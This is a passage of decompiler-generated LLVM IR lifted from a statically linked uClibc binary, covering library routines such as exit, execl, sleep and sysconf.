  uselistorder i32 %v4_8050fb5, { 4, 3, 0, 1, 2, 5 }
  uselistorder i32 %v0_8050faf, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %ebp.global-to-local, { 2, 3, 0, 4, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 9, 10, 7, 8, 11, 12, 13, 14, 15, 16, 0 }
  uselistorder i32 -17, { 28, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80510b3, { 1, 0 }
  uselistorder label %dec_label_pc_80510ab, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051087, { 1, 0 }
  uselistorder label %dec_label_pc_8051044, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805102e, { 1, 0 }
  uselistorder label %dec_label_pc_805100f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8051005, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050fe1, { 1, 0 }
  uselistorder label %dec_label_pc_8050fe0, { 1, 0 }
  uselistorder label %dec_label_pc_8050fc1, { 1, 0 }
}

define i32 @__GI_exit(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_80510d3 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80510d3, i32* @ebx, align 4
  %v2_80510d8 = call i32 @__pthread_return_void(i32 %v2_80510d3, i32 134550743)
  %v1_80510e4 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8058460.244 to i32))
  %v0_80510e9 = load i32, i32* @global_var_805e704.245, align 4
  store i32 %v0_80510e9, i32* @eax, align 4
  %v1_80510f1 = icmp eq i32 %v0_80510e9, 0
  br i1 %v1_80510f1, label %dec_label_pc_80510fe, label %dec_label_pc_80510f5

dec_label_pc_80510f5:                             ; preds = %entry
  %v0_80510f8 = load i32, i32* @esi, align 4
  %v1_80510f9 = call i32 @unknown_0(i32 %v0_80510f8)
  store i32 %v1_80510f9, i32* @eax, align 4
  br label %dec_label_pc_80510fe

dec_label_pc_80510fe:                             ; preds = %entry, %dec_label_pc_80510f5
  %v2_8051103 = call i32 @__pthread_return_void(i32 %v2_80510d3, i32 1)
  %v0_8051108 = call i32 @__GI___uClibc_fini()
  %v0_8051119 = call i32 @_stdio_term()
  %v0_8051121 = load i32, i32* @esi, align 4
  %v1_8051122 = call i32 @__GI__exit(i32 %v0_8051121)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @__GI__exit, { 1, 0, 4, 3, 10, 9, 8, 7, 6, 5, 2 }
  uselistorder label %dec_label_pc_80510fe, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_805112c = load i32, i32* @ebx, align 4
  store i32 %v0_805112c, i32* %stack_var_-12, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_805112f = ptrtoint i32* %stack_var_12 to i32
  store i32 %v2_805112f, i32* %eax.global-to-local, align 4
  %v12_8051132 = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_8051138

dec_label_pc_8051138:                             ; preds = %dec_label_pc_8051138, %entry
  %v0_805113b = phi i32 [ 0, %entry ], [ %v1_805113b, %dec_label_pc_8051138 ]
  %stack_var_-16.0 = phi i32 [ %v2_805112f, %entry ], [ %v1_805113c, %dec_label_pc_8051138 ]
  %v1_805113b = add i32 %v0_805113b, 1
  store i32 %v1_805113b, i32* %esi.global-to-local, align 4
  %v1_805113c = add i32 %stack_var_-16.0, 4
  store i32 %v1_805113c, i32* %eax.global-to-local, align 4
  %v1_8051142 = inttoptr i32 %stack_var_-16.0 to i32*
  %v2_8051142 = load i32, i32* %v1_8051142, align 4
  %v3_8051142 = icmp eq i32 %v2_8051142, 0
  %v1_8051145 = icmp eq i1 %v3_8051142, false
  br i1 %v1_8051145, label %dec_label_pc_8051138, label %dec_label_pc_8051147

dec_label_pc_8051147:                             ; preds = %dec_label_pc_8051138
  %v1_8051147 = mul i32 %v1_805113b, 4
  %v2_8051147 = add i32 %v1_8051147, 34
  %v1_805114e = and i32 %v2_8051147, -16
  %v2_8051151 = sub i32 %v12_8051132, %v1_805114e
  %v1_8051156 = add i32 %v2_8051151, 15
  %v1_805115a = and i32 %v1_8051156, -16
  store i32 %v1_805115a, i32* @ebx, align 4
  store i32 %v1_805115a, i32* %ecx.global-to-local, align 4
  %v2_805115f = inttoptr i32 %v1_805115a to i32*
  store i32 %arg2, i32* %v2_805115f, align 16
  store i32 %v2_805112f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051167

dec_label_pc_8051167:                             ; preds = %dec_label_pc_8051167, %dec_label_pc_8051147
  %stack_var_-16.1 = phi i32 [ %v2_805112f, %dec_label_pc_8051147 ], [ %v1_805116e, %dec_label_pc_8051167 ]
  store i32 %stack_var_-16.1, i32* %eax.global-to-local, align 4
  %v0_805116a = load i32, i32* %ecx.global-to-local, align 4
  %v1_805116a = add i32 %v0_805116a, 4
  store i32 %v1_805116a, i32* %ecx.global-to-local, align 4
  %v0_805116d = load i32, i32* %esi.global-to-local, align 4
  %v1_805116d = add i32 %v0_805116d, -1
  %v8_805116d = icmp eq i32 %v1_805116d, 0
  store i32 %v1_805116d, i32* %esi.global-to-local, align 4
  %v1_805116e = add i32 %stack_var_-16.1, 4
  %v1_8051174 = inttoptr i32 %stack_var_-16.1 to i32*
  %v2_8051174 = load i32, i32* %v1_8051174, align 4
  store i32 %v2_8051174, i32* %eax.global-to-local, align 4
  %v2_8051176 = inttoptr i32 %v1_805116a to i32*
  store i32 %v2_8051174, i32* %v2_8051176, align 4
  %v1_8051178 = icmp eq i1 %v8_805116d, false
  br i1 %v1_8051178, label %dec_label_pc_8051167, label %dec_label_pc_805117a

dec_label_pc_805117a:                             ; preds = %dec_label_pc_8051167
  %v0_805117a = load i32, i32* %eax.global-to-local, align 4
  %v1_805117a = load i32, i32* @esp, align 4
  %v2_805117a = add i32 %v1_805117a, -4
  %v3_805117a = inttoptr i32 %v2_805117a to i32*
  store i32 %v0_805117a, i32* %v3_805117a, align 4
  %v0_805117b = load i32, i32* @global_var_805e70c.246, align 4
  %v2_805117b = add i32 %v1_805117a, -8
  %v3_805117b = inttoptr i32 %v2_805117b to i32*
  store i32 %v0_805117b, i32* %v3_805117b, align 4
  %v0_8051181 = load i32, i32* @ebx, align 4
  %v2_8051181 = add i32 %v1_805117a, -12
  %v3_8051181 = inttoptr i32 %v2_8051181 to i32*
  store i32 %v0_8051181, i32* %v3_8051181, align 4
  %v5_8051182 = add i32 %v1_805117a, -16
  %v6_8051182 = inttoptr i32 %v5_8051182 to i32*
  store i32 %arg1, i32* %v6_8051182, align 4
  %v1_8051185 = inttoptr i32 %v1_805116e to i8*
  %v2_8051185 = call i32 @__GI_execve(i8* %v1_8051185)
  store i32 %v2_8051185, i32* %eax.global-to-local, align 4
  %v2_805118d = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_805118d, i32* @ebx, align 4
  ret i32 %v2_8051185

; uselistorder directives
  uselistorder i32 %v1_805116d, { 1, 0 }
  uselistorder i32 %stack_var_-16.1, { 1, 0, 2 }
  uselistorder i32 %v1_805113c, { 1, 0 }
  uselistorder i32 %v1_805113b, { 0, 2, 1 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %v2_805112f, { 0, 2, 1, 3 }
}

define i32 @sleep() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8051195 = load i32, i32* @edi, align 4
  %v0_8051196 = load i32, i32* @esi, align 4
  %v0_8051197 = load i32, i32* @ebx, align 4
  %v15_8051198 = ptrtoint i32* %stack_var_-444 to i32
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* %edx.global-to-local, align 4
  %v1_80511aa = icmp eq i32 %tmp11, 0
  %v1_80511ac = icmp eq i1 %v1_80511aa, false
  br i1 %v1_80511ac, label %dec_label_pc_80511be.preheader, label %dec_label_pc_805130b

dec_label_pc_80511be.preheader:                   ; preds = %entry
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80511b3

dec_label_pc_80511b3:                             ; preds = %dec_label_pc_80511b3.dec_label_pc_80511b3_crit_edge, %dec_label_pc_80511be.preheader
  %v0_80511b3 = phi i32 [ %v15_8051198, %dec_label_pc_80511be.preheader ], [ %v0_80511b3.pre, %dec_label_pc_80511b3.dec_label_pc_80511b3_crit_edge ]
  %v1_80511be27 = phi i32 [ 31, %dec_label_pc_80511be.preheader ], [ %v1_80511be, %dec_label_pc_80511b3.dec_label_pc_80511b3_crit_edge ]
  %v2_80511b3 = mul i32 %v1_80511be27, 4
  %v3_80511b3 = add i32 %v2_80511b3, 292
  %v4_80511b3 = add i32 %v3_80511b3, %v0_80511b3
  %v5_80511b3 = inttoptr i32 %v4_80511b3 to i32*
  store i32 0, i32* %v5_80511b3, align 4
  %v0_80511be.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80511be = add i32 %v0_80511be.pre, -1
  %v9_80511be = icmp slt i32 %v1_80511be, 0
  store i32 %v1_80511be, i32* %eax.global-to-local, align 4
  %v1_80511bf = icmp eq i1 %v9_80511be, false
  br i1 %v1_80511bf, label %dec_label_pc_80511b3.dec_label_pc_80511b3_crit_edge, label %dec_label_pc_80511c1

dec_label_pc_80511b3.dec_label_pc_80511b3_crit_edge: ; preds = %dec_label_pc_80511b3
  %v0_80511b3.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80511b3

dec_label_pc_80511c1:                             ; preds = %dec_label_pc_80511b3
  store i32 %tmp11, i32* %stack_var_-24, align 4
  %v2_80511d7 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_80511d7, i32* @ebx, align 4
  store i32 %v2_80511d7, i32* %stack_var_-460, align 4
  %v4_80511df = call i32 @__sigaddset(i32 %v2_80511d7, i32 17, i32 %v1_80511be, i32 %v1_80511be)
  store i32 %v4_80511df, i32* %eax.global-to-local, align 4
  %v2_80511e7 = icmp slt i32 %v4_80511df, 0
  br i1 %v2_80511e7, label %dec_label_pc_805130f, label %dec_label_pc_80511ef

dec_label_pc_80511ef:                             ; preds = %dec_label_pc_80511c1
  %v2_80511f0 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_80511f0, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_80511fb = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_80511fb = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_80511fb, i32 %v2_80511f0)
  store i32 %v4_80511fb, i32* %eax.global-to-local, align 4
  %v1_8051203 = icmp eq i32 %v4_80511fb, 0
  %v1_8051205 = icmp eq i1 %v1_8051203, false
  br i1 %v1_8051205, label %dec_label_pc_805130f, label %dec_label_pc_805120b

dec_label_pc_805120b:                             ; preds = %dec_label_pc_80511ef
  store i32 %v2_80511f0, i32* %stack_var_-460, align 4
  %v4_8051210 = call i32 @__sigismember(i32 %v2_80511f0, i32 17, i32 %v4_80511fb, i32 %v4_80511fb)
  store i32 %v4_8051210, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_805121d = icmp eq i32 %v4_8051210, 0
  br i1 %v1_805121d, label %dec_label_pc_8051231.preheader, label %dec_label_pc_80512d9

dec_label_pc_8051231.preheader:                   ; preds = %dec_label_pc_805120b
  store i32 31, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051226

dec_label_pc_8051226:                             ; preds = %dec_label_pc_8051226.dec_label_pc_8051226_crit_edge, %dec_label_pc_8051231.preheader
  %v0_8051226 = phi i32 [ %v15_8051198, %dec_label_pc_8051231.preheader ], [ %v0_8051226.pre, %dec_label_pc_8051226.dec_label_pc_8051226_crit_edge ]
  %v1_805123126 = phi i32 [ 31, %dec_label_pc_8051231.preheader ], [ %v1_8051231, %dec_label_pc_8051226.dec_label_pc_8051226_crit_edge ]
  %v2_8051226 = mul i32 %v1_805123126, 4
  %v3_8051226 = add i32 %v2_8051226, 292
  %v4_8051226 = add i32 %v3_8051226, %v0_8051226
  %v5_8051226 = inttoptr i32 %v4_8051226 to i32*
  store i32 0, i32* %v5_8051226, align 4
  %v0_8051231.pre = load i32, i32* %edx.global-to-local, align 4
  %v1_8051231 = add i32 %v0_8051231.pre, -1
  %v9_8051231 = icmp slt i32 %v1_8051231, 0
  store i32 %v1_8051231, i32* %edx.global-to-local, align 4
  %v1_8051232 = icmp eq i1 %v9_8051231, false
  br i1 %v1_8051232, label %dec_label_pc_8051226.dec_label_pc_8051226_crit_edge, label %dec_label_pc_8051234

dec_label_pc_8051226.dec_label_pc_8051226_crit_edge: ; preds = %dec_label_pc_8051226
  %v0_8051226.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8051226

dec_label_pc_8051234:                             ; preds = %dec_label_pc_8051226
  store i32 %v2_80511d7, i32* %eax.global-to-local, align 4
  store i32 %v2_80511d7, i32* %stack_var_-460, align 4
  %v4_8051240 = call i32 @__sigaddset(i32 %v2_80511d7, i32 17, i32 0, i32 0)
  store i32 %v4_8051240, i32* %eax.global-to-local, align 4
  %v2_8051248 = icmp slt i32 %v4_8051240, 0
  br i1 %v2_8051248, label %dec_label_pc_805130f, label %dec_label_pc_8051250

dec_label_pc_8051250:                             ; preds = %dec_label_pc_8051234
  %v2_8051251 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8051251, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_805125a = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_8051251)
  store i32 %v4_805125a, i32* %eax.global-to-local, align 4
  %v2_8051262 = icmp slt i32 %v4_805125a, 0
  %v1_8051264 = icmp eq i1 %v2_8051262, false
  br i1 %v1_8051264, label %dec_label_pc_805128e, label %dec_label_pc_8051266

dec_label_pc_8051266:                             ; preds = %dec_label_pc_8051250
  %v0_8051266 = load i32, i32* %stack_var_-460, align 4
  %v1_8051266 = call i32 @__errno_location(i32 %v0_8051266)
  store i32 %v1_8051266, i32* %eax.global-to-local, align 4
  store i32 %v1_8051266, i32* @ebx, align 4
  %v1_805126d = inttoptr i32 %v1_8051266 to i32*
  %v2_805126d = load i32, i32* %v1_805126d, align 4
  store i32 %v2_805126d, i32* @esi, align 4
  store i32 %v2_80511f0, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_805127c = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_805127c = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_805127c, i32 0)
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8051287 = load i32, i32* @esi, align 4
  %v1_8051287 = load i32, i32* @ebx, align 4
  %v2_8051287 = inttoptr i32 %v1_8051287 to i32*
  store i32 %v0_8051287, i32* %v2_8051287, align 4
  %v0_805131c.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051312

dec_label_pc_805128e:                             ; preds = %dec_label_pc_8051250
  %v3_805128e = load i32, i32* %stack_var_-420, align 4
  %v12_805128e = icmp eq i32 %v3_805128e, 1
  %v2_805129a = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_805129a, i32* @ebx, align 4
  %v1_80512a1 = icmp eq i1 %v12_805128e, false
  br i1 %v1_80512a1, label %dec_label_pc_80512c8, label %dec_label_pc_80512a3

dec_label_pc_80512a3:                             ; preds = %dec_label_pc_805128e
  store i32 %v2_805129a, i32* %stack_var_-460, align 4
  %v2_80512a7 = bitcast i32* %stack_var_-24 to %timespec*
  %v3_80512a7 = call i32 @__libc_nanosleep(%timespec* %v2_80512a7, i32 %v2_805129a)
  store i32 %v3_80512a7, i32* %eax.global-to-local, align 4
  store i32 %v3_80512a7, i32* @edi, align 4
  %v1_80512ae = call i32 @__errno_location(i32 %v2_805129a)
  store i32 %v1_80512ae, i32* %eax.global-to-local, align 4
  store i32 %v1_80512ae, i32* @ebx, align 4
  %v1_80512b8 = inttoptr i32 %v1_80512ae to i32*
  %v2_80512b8 = load i32, i32* %v1_80512b8, align 4
  store i32 %v2_80512b8, i32* @esi, align 4
  store i32 2, i32* %stack_var_-460, align 4
  %v3_80512bf = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_80512bf = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80512bf, i32 0)
  store i32 %v4_80512bf, i32* %eax.global-to-local, align 4
  %v0_80512c4 = load i32, i32* @esi, align 4
  %v1_80512c4 = load i32, i32* @ebx, align 4
  %v2_80512c4 = inttoptr i32 %v1_80512c4 to i32*
  store i32 %v0_80512c4, i32* %v2_80512c4, align 4
  %v0_80512ee.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80512eb

dec_label_pc_80512c8:                             ; preds = %dec_label_pc_805128e
  store i32 2, i32* %stack_var_-460, align 4
  %v3_80512ce = bitcast i32* %stack_var_-280 to %_TYPEDEF_sigset_t*
  %v4_80512ce = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_80512ce, i32 0)
  store i32 %v4_80512ce, i32* %eax.global-to-local, align 4
  store i32 2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80512e4

dec_label_pc_80512d9:                             ; preds = %dec_label_pc_805120b
  %v2_80512db = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80512db, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80512e4

dec_label_pc_80512e4:                             ; preds = %dec_label_pc_80512c8, %dec_label_pc_80512d9
  %storemerge3.pre-phi = phi i32 [ %v2_805129a, %dec_label_pc_80512c8 ], [ %v2_80512db, %dec_label_pc_80512d9 ]
  store i32 %storemerge3.pre-phi, i32* %stack_var_-460, align 4
  %v2_80512e4 = bitcast i32* %stack_var_-24 to %timespec*
  %v3_80512e4 = call i32 @__libc_nanosleep(%timespec* %v2_80512e4, i32 %storemerge3.pre-phi)
  store i32 %v3_80512e4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80512eb

dec_label_pc_80512eb:                             ; preds = %dec_label_pc_80512a3, %dec_label_pc_80512e4
  %v0_80512ee = phi i32 [ %v0_80512ee.pre, %dec_label_pc_80512a3 ], [ %v3_80512e4, %dec_label_pc_80512e4 ]
  %v1_80512ee = icmp eq i32 %v0_80512ee, 0
  br i1 %v1_80512ee, label %dec_label_pc_805130b, label %dec_label_pc_80512f2

dec_label_pc_80512f2:                             ; preds = %dec_label_pc_80512eb
  %v4_8051302 = load i32, i32* %stack_var_-24, align 4
  store i32 %v4_8051302, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051312

dec_label_pc_805130b:                             ; preds = %entry, %dec_label_pc_80512eb
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051312

dec_label_pc_805130f:                             ; preds = %dec_label_pc_8051234, %dec_label_pc_80511ef, %dec_label_pc_80511c1
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051312

dec_label_pc_8051312:                             ; preds = %dec_label_pc_805130b, %dec_label_pc_80512f2, %dec_label_pc_8051266, %dec_label_pc_805130f
  %v0_805131c = phi i32 [ 0, %dec_label_pc_805130b ], [ %v4_8051302, %dec_label_pc_80512f2 ], [ %v0_805131c.pre, %dec_label_pc_8051266 ], [ -1, %dec_label_pc_805130f ]
  store i32 %v0_8051197, i32* @ebx, align 4
  store i32 %v0_8051196, i32* @esi, align 4
  store i32 %v0_8051195, i32* @edi, align 4
  ret i32 %v0_805131c

; uselistorder directives
  uselistorder i32 %storemerge3.pre-phi, { 1, 0 }
  uselistorder i32 %v1_80512ae, { 1, 0, 2 }
  uselistorder i32 %v2_805129a, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_8051231, { 2, 1, 0 }
  uselistorder i32 %v2_80511f0, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v2_80511d7, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v1_80511be, { 0, 1, 4, 3, 2 }
  uselistorder i32* %stack_var_-460, { 0, 2, 3, 4, 5, 1, 6, 7, 8, 9, 10 }
  uselistorder i32* %stack_var_-24, { 2, 0, 4, 1, 5, 3 }
  uselistorder i32 %tmp11, { 0, 2, 1 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 22, 21, 0, 23 }
  uselistorder i32 (i32, i32*, i32)* @__libc_sigaction, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigismember, { 1, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @__GI_sigprocmask, { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 (i32, i32, i32, i32)* @__sigaddset, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_8051312, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805130b, { 1, 0 }
  uselistorder label %dec_label_pc_80512eb, { 1, 0 }
  uselistorder label %dec_label_pc_80512e4, { 1, 0 }
}

define i32 @sysconf(i32 %arg1) local_unnamed_addr {
entry:
  switch i32 %arg1, label %dec_label_pc_805133f [
    i32 0, label %dec_label_pc_805134f
    i32 1, label %dec_label_pc_8051434
    i32 2, label %dec_label_pc_8051359
    i32 3, label %dec_label_pc_8051363
    i32 4, label %dec_label_pc_805136d
    i32 5, label %dec_label_pc_8051403
    i32 6, label %dec_label_pc_8051375
    i32 7, label %dec_label_pc_8051335
    i32 8, label %dec_label_pc_8051335
    i32 9, label %dec_label_pc_8051335
    i32 10, label %dec_label_pc_8051335
    i32 11, label %dec_label_pc_8051335
    i32 12, label %dec_label_pc_8051335
    i32 13, label %dec_label_pc_8051335
    i32 14, label %dec_label_pc_8051335
    i32 15, label %dec_label_pc_8051335
    i32 16, label %dec_label_pc_8051335
    i32 17, label %dec_label_pc_8051335
    i32 18, label %dec_label_pc_8051335
    i32 19, label %dec_label_pc_8051335
    i32 20, label %dec_label_pc_8051335
    i32 21, label %dec_label_pc_8051335
    i32 22, label %dec_label_pc_8051335
    i32 23, label %dec_label_pc_8051434
    i32 24, label %dec_label_pc_8051434
    i32 25, label %dec_label_pc_8051440
    i32 26, label %dec_label_pc_8051411
    i32 27, label %dec_label_pc_8051434
    i32 28, label %dec_label_pc_8051387
    i32 29, label %dec_label_pc_805140a
    i32 30, label %dec_label_pc_805137f
    i32 31, label %dec_label_pc_805141f
    i32 32, label %dec_label_pc_8051434
    i32 33, label %dec_label_pc_8051434
    i32 34, label %dec_label_pc_8051434
    i32 35, label %dec_label_pc_8051418
    i32 36, label %dec_label_pc_8051447
    i32 37, label %dec_label_pc_805144e
    i32 38, label %dec_label_pc_8051447
    i32 39, label %dec_label_pc_8051391
    i32 40, label %dec_label_pc_8051455
    i32 41, label %dec_label_pc_8051434
    i32 42, label %dec_label_pc_805141f
    i32 43, label %dec_label_pc_805144e
    i32 44, label %dec_label_pc_805145c
    i32 45, label %dec_label_pc_805144e
    i32 46, label %dec_label_pc_805140a
    i32 47, label %dec_label_pc_805140a
    i32 48, label %dec_label_pc_805140a
    i32 49, label %dec_label_pc_8051434
    i32 50, label %dec_label_pc_8051434
    i32 51, label %dec_label_pc_805140a
    i32 52, label %dec_label_pc_805140a
    i32 53, label %dec_label_pc_8051434
    i32 54, label %dec_label_pc_8051434
    i32 55, label %dec_label_pc_8051434
    i32 56, label %dec_label_pc_8051434
    i32 57, label %dec_label_pc_8051434
    i32 58, label %dec_label_pc_8051434
    i32 59, label %dec_label_pc_8051434
    i32 60, label %dec_label_pc_8051434
    i32 61, label %dec_label_pc_8051434
    i32 62, label %dec_label_pc_8051434
    i32 63, label %dec_label_pc_8051434
    i32 64, label %dec_label_pc_8051434
    i32 65, label %dec_label_pc_8051434
    i32 66, label %dec_label_pc_8051434
    i32 67, label %dec_label_pc_8051335
    i32 68, label %dec_label_pc_8051335
    i32 69, label %dec_label_pc_8051418
    i32 70, label %dec_label_pc_8051418
    i32 71, label %dec_label_pc_8051418
    i32 72, label %dec_label_pc_805141f
    i32 73, label %dec_label_pc_8051426
    i32 74, label %dec_label_pc_805142d
    i32 75, label %dec_label_pc_805139b
    i32 76, label %dec_label_pc_805142d
    i32 77, label %dec_label_pc_8051335
    i32 78, label %dec_label_pc_8051335
    i32 79, label %dec_label_pc_8051335
    i32 80, label %dec_label_pc_8051335
    i32 81, label %dec_label_pc_8051335
    i32 82, label %dec_label_pc_8051335
    i32 83, label %dec_label_pc_8051335
    i32 84, label %dec_label_pc_8051335
    i32 85, label %dec_label_pc_8051434
    i32 86, label %dec_label_pc_8051434
    i32 87, label %dec_label_pc_8051411
    i32 88, label %dec_label_pc_80513a5
    i32 89, label %dec_label_pc_80513af
    i32 90, label %dec_label_pc_8051426
    i32 91, label %dec_label_pc_8051335
    i32 92, label %dec_label_pc_8051335
    i32 93, label %dec_label_pc_8051335
    i32 94, label %dec_label_pc_8051335
    i32 95, label %dec_label_pc_805140a
    i32 96, label %dec_label_pc_8051434
    i32 97, label %dec_label_pc_8051434
    i32 98, label %dec_label_pc_8051335
    i32 99, label %dec_label_pc_8051335
    i32 100, label %dec_label_pc_8051335
    i32 101, label %dec_label_pc_80513b9
    i32 102, label %dec_label_pc_80513fc
    i32 103, label %dec_label_pc_8051439
    i32 104, label %dec_label_pc_8051411
    i32 105, label %dec_label_pc_80513c3
    i32 106, label %dec_label_pc_805141f
    i32 107, label %dec_label_pc_805141f
    i32 108, label %dec_label_pc_8051403
    i32 109, label %dec_label_pc_8051440
    i32 110, label %dec_label_pc_805145c
    i32 111, label %dec_label_pc_80513fc
    i32 112, label %dec_label_pc_8051439
    i32 113, label %dec_label_pc_805145c
    i32 114, label %dec_label_pc_80513cd
    i32 115, label %dec_label_pc_8051455
    i32 116, label %dec_label_pc_8051434
    i32 117, label %dec_label_pc_8051434
    i32 118, label %dec_label_pc_80513d7
    i32 119, label %dec_label_pc_80513e1
    i32 120, label %dec_label_pc_805144e
    i32 121, label %dec_label_pc_8051411
    i32 122, label %dec_label_pc_8051411
    i32 123, label %dec_label_pc_8051411
    i32 124, label %dec_label_pc_8051411
    i32 125, label %dec_label_pc_8051335
    i32 126, label %dec_label_pc_8051335
    i32 127, label %dec_label_pc_8051434
    i32 128, label %dec_label_pc_8051434
    i32 129, label %dec_label_pc_8051335
    i32 130, label %dec_label_pc_8051335
    i32 131, label %dec_label_pc_8051434
    i32 149, label %dec_label_pc_80513e8
  ]

dec_label_pc_8051335:                             ; preds = %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry, %entry
  br label %dec_label_pc_8051461

dec_label_pc_805133f:                             ; preds = %entry
  %v1_805133f = call i32 @__errno_location(i32 ptrtoint (i32* @0 to i32))
  %v1_8051344 = inttoptr i32 %v1_805133f to i32*
  store i32 22, i32* %v1_8051344, align 4
  br label %dec_label_pc_8051434

dec_label_pc_805134f:                             ; preds = %entry
  br label %dec_label_pc_8051461

dec_label_pc_8051359:                             ; preds = %entry
  br label %dec_label_pc_8051461

dec_label_pc_8051363:                             ; preds = %entry
  br label %dec_label_pc_8051461

dec_label_pc_805136d:                             ; preds = %entry
  %v0_8051370 = call i32 @getdtablesize()
  br label %dec_label_pc_8051375

dec_label_pc_8051375:                             ; preds = %entry, %dec_label_pc_805136d
  br label %dec_label_pc_8051461

dec_label_pc_805137f:                             ; preds = %entry
  %v3_8051382 = call i32 @__GI_getpagesize(i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_8051387

dec_label_pc_8051387:                             ; preds = %entry, %dec_label_pc_805137f
  br label %dec_label_pc_8051461

dec_label_pc_8051391:                             ; preds = %entry
  br label %dec_label_pc_8051461

dec_label_pc_805139b:                             ; preds = %entry
  br label %dec_label_pc_8051461

dec_label_pc_80513a5:                             ; preds = %entry
  br label %dec_label_pc_8051461

dec_label_pc_80513af:                             ; preds = %entry
  br label %dec_label_pc_8051461

dec_label_pc_80513b9:                             ; preds = %entry
  br label %dec_label_pc_8051461

dec_label_pc_80513c3:                             ; preds = %entry
  br label %dec_label_pc_8051461

dec_label_pc_80513cd:                             ; preds = %entry
  br label %dec_label_pc_8051461

